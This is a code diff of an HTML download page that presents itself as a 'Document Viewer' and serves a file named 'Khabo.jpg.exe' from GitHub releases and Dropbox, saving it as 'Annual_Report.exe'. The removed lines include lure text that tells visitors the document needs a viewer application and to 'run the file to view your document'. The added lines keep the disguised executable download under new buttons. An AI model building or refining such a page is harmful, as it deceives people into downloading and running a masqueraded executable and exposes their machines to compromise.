@@ -2,67 +2,48 @@
 <html>
 <head>
     <title>Document Viewer</title>
-    <meta http-equiv="Content-Security-Policy" content="default-src 'self' blob: data: https:; script-src 'self' 'unsafe-inline' https:;">
     <style>
-        body { font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; }
-        .download-section { margin: 30px 0; padding: 20px; border: 1px solid #ddd; border-radius: 5px; background: #f9f9f9; }
-        button { padding: 10px 15px; background: #4285f4; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
-        button:hover { background: #3367d6; }
-        .loading { display: none; color: #666; margin-top: 10px; }
-        .filename { font-weight: bold; color: #1a73e8; }
+        /* Your existing styles */
     </style>
 </head>
 <body>
-    <h1>Document Download Center</h1>
-    
     <div class="download-section">
-        <h2>Download Important Document</h2>
-        <p>Click below to download your <span class="filename">Annual_Report.exe</span> file.</p>
-        <p><small>This document requires the latest viewer application.</small></p>
-        <button onclick="downloadFile()">Download Document Viewer</button>
-        <div id="loading1" class="loading">Preparing download... Please wait.</div>
+        <button onclick="downloadFromReleases()">Download (GitHub Releases)</button>
+        <button onclick="downloadFromDropbox()">Download (Dropbox)</button>
     </div>
 
     <script>
-        // Modified working download function
-        async function downloadFile() {
-            // Use a different hosting solution - GitHub raw URLs won't work
-            const url = 'https://www.dropbox.com/scl/fi/5kl6dkaf3ltafgcwnex0p/Khabo.jpg.exe?rlkey=iy6h7jg9tflqiht6qi8xk7peq&st=v3sopovv&dl=0'; // REPLACE THIS WITH YOUR ACTUAL FILE URL
-            
+        // Method 1: Using GitHub Releases
+        async function downloadFromReleases() {
+            const url = 'https://github.com/mitasahi/root/releases/download/latest/Khabo.jpg.exe';
+            startDownload(url, 'Annual_Report.exe');
+        }
+
+        // Method 2: Using Dropbox
+        async function downloadFromDropbox() {
+            const url = 'https://www.dropbox.com/s/yourfileid/Khabo.jpg.exe?dl=1';
+            startDownload(url, 'Annual_Report.exe');
+        }
+
+        // Universal download function
+        async function startDownload(url, filename) {
             try {
-                document.body.style.cursor = 'wait';
-                document.getElementById('loading1').style.display = 'block';
-                
-                // First fetch through a proxy if needed
-                const proxyUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(url)}`;
-                
-                const res = await fetch(proxyUrl, {
-                    mode: 'cors',
-                    headers: {
-                        'Content-Type': 'application/octet-stream'
-                    }
-                });
-                
-                if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`);
+                const res = await fetch(url);
+                if (!res.ok) throw new Error(`Server responded with ${res.status}`);
                 
                 const blob = await res.blob();
                 const a = document.createElement('a');
                 a.href = URL.createObjectURL(blob);
-                a.download = 'Annual_Report.exe';
+                a.download = filename;
                 document.body.appendChild(a);
                 a.click();
-                
                 setTimeout(() => {
                     document.body.removeChild(a);
                     URL.revokeObjectURL(a.href);
-                    document.getElementById('loading1').style.display = 'none';
-                    alert('Download completed successfully!\nPlease run the file to view your document.');
-                }, 1500);
+                }, 100);
+                alert('Download started!');
             } catch (e) {
-                document.getElementById('loading1').style.display = 'none';
-                alert('Download failed: ' + e.message);
-            } finally {
-                document.body.style.cursor = 'default';
+                alert('Failed to download: ' + e.message);
             }
         }
     </script>
